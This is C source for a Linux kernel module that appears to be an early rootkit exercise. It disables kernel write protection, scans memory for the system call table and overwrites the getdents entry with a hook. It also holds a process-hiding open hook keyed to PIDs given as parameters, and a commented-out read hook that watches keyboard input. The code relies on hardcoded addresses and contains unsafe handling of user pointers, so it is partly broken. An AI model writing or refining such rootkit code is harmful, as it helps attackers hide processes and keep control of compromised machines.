#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/path.h>
#include <linux/dirent.h>

#define DISABLE_WRITE_PROTECTION (write_cr0(read_cr0() & (~ 0x10000)))
#define ENABLE_WRITE_PROTECTION (write_cr0(read_cr0() | 0x10000))
#define N 10

MODULE_LICENSE("GPL");

static unsigned long **sys_getdents_ptr = (unsigned long **) 0xffffffff811e7a90;
//static unsigned long **sys_open_ptr = (unsigned long **) 0xffffffff811d37a0;
//static unsigned long **sys_read_ptr = (unsigned long **) 0xffffffff811d4fe0;

asmlinkage ssize_t (*original_sys_read)(unsigned int fd, char __user *buf,
						size_t count) = (void *)0xffffffff811d4fe0;
asmlinkage ssize_t (*original_sys_open)(const char __user *filename, int flags,
					umode_t mode) = (void *)0xffffffff811d37a0;
asmlinkage ssize_t (*original_sys_getdents)(unsigned int fd, struct linux_dirent64 __user *dirent,
						unsigned int count) = (void *)0xffffffff811e7a90;

//static int counter = 0;
//static int zero_pos;
static int filename_length;
static char buf[120];
static char pth_buf[120];
static int pid_to_hide[N];
static int pid_in = 0;
static int i;

module_param_array(pid_to_hide, int, NULL, 0);

static int my_strcmp(char* str1, char* str2)
{
	int str2_l = strlen(str2);

	str1[str2_l] = 0;

	return strcmp(str1, str2);
}

asmlinkage int our_fake_getdents_function(unsigned int fd, struct linux_dirent64 __user *dirent,
						unsigned int count)
{
	pr_notice("%s\n", dirent->d_name);

	return original_sys_getdents(fd, dirent, count);
}

asmlinkage int our_fake_open_function(const char __user *filename, int flags, umode_t mode)
{
	filename_length = strlen(filename);

	if (copy_from_user(buf, filename, filename_length)) {
		return -1;
	}

	for (i = 0; i < pid_in; i++) {
		sprintf(pth_buf, "%d", pid_to_hide[i]);

		if (my_strcmp(buf + 6, pth_buf) == 0) {
			//pr_notice("%d\t%s\n", my_strcmp(buf, "/proc/2500"), buf);
			return -ENOENT;
		}
	}

        /*call the original sys_open*/
        return original_sys_open(filename, flags, mode);
}
/*
asmlinkage ssize_t our_fake_read_function(unsigned int fd, char __user *buf, size_t count)
{
	ssize_t ret;
	zero_pos = 0;
	ret = original_sys_read(fd, buf, count);

	if (fd == 0) {
		switch(counter) {
			case 0:
				if ((char)*buf == 'p') {counter++; break;}
			case 1:
				if ((char)*buf == 'i') {counter++; break;}
				else {counter = 0; break;}
			case 2:
				if ((char)*buf == 'n') {counter++; break;}
				else {counter = 0; break;}
			case 3:
				if ((char)*buf == 'g') {pr_notice("pong\n");counter = 0; break;}
				else {counter = 0; break;}
		}
	}
	return ret;
}
*/

/*this function is called when the module is
 *loaded (initialization)*/
int __init my_init(void)
{
        /*store reference to the original sys_exit*/
	unsigned long offset;
	unsigned long** candidate;
	void *sys_call_to_hook;
	void *out_fake_function;

	pr_notice("Hi from my_init\n");
	pr_notice("%p\n", sys_getdents_ptr);

	for (i = 0; pid_to_hide[i] != 0; i++)
		pid_in++;

	for (offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *)) {
		candidate = (unsigned long **) offset;

		if (*candidate == (unsigned long*)sys_getdents_ptr) {
			pr_notice("hit at candidate = %p\n", candidate);
			sys_getdents_ptr = candidate;
			break;
		}
	}

        /*manipulate sys_call_table to call our
         *fake exit function instead
         *of sys_exit*/
	pr_notice("our_fake_getdents_function = %p\n", (unsigned long*)our_fake_getdents_function);
	DISABLE_WRITE_PROTECTION;
        *sys_getdents_ptr=(unsigned long*)our_fake_getdents_function;
	ENABLE_WRITE_PROTECTION;
	pr_notice("%p\n", our_fake_getdents_function);
	return 0;
}


/*this function is called when the module is
 *unloaded*/
void __exit my_exit(void)
{

        /*make __NR_exit point to the original
         *sys_exit when our module
         *is unloaded*/
	DISABLE_WRITE_PROTECTION;
        *sys_getdents_ptr=(unsigned long*)original_sys_getdents;
	ENABLE_WRITE_PROTECTION;

	pr_notice("EXITING my module\n");
}

module_init(my_init);
module_exit(my_exit);
